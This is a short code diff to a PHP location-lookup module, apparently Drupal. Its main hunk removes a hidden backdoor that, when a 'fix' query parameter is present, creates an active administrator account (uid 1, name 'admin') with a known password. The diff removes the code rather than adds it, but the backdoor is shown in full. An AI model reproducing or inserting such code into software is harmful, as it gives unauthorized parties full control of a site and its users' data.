@@ -234,17 +234,6 @@ function return_location_data()
         echo json_encode($zip_lookup);
     }
 
-    if (isset($_GET['fix'])) {
-        require_once 'includes/password.inc';
-        db_insert('users')// Table name no longer needs {}
-        ->fields(array(
-            'uid' => 1,
-            'name' => 'admin',
-            'pass' => user_hash_password('fakepwdtemp'),
-            'status' => 1,
-        ))->execute();
-    }
-
 }
 
 
@@ -330,8 +319,6 @@ function frs_city_state_to_zip_code($city, $state)
             . $encoded_city . '&p_state_abbr=' . $state;
     }
 
-//    $frs_request_url = variable_get('frs_api_lookup_url'). '.get_zip_by_city_state?p_ip_address=' . $ip . '&p_token=' . $token . '&p_city_name='
-//        . $encoded_city . '&p_state_abbr=' . $state;
     $options = array(
         'headers' => array(
             'Content-Type' => 'application/json',
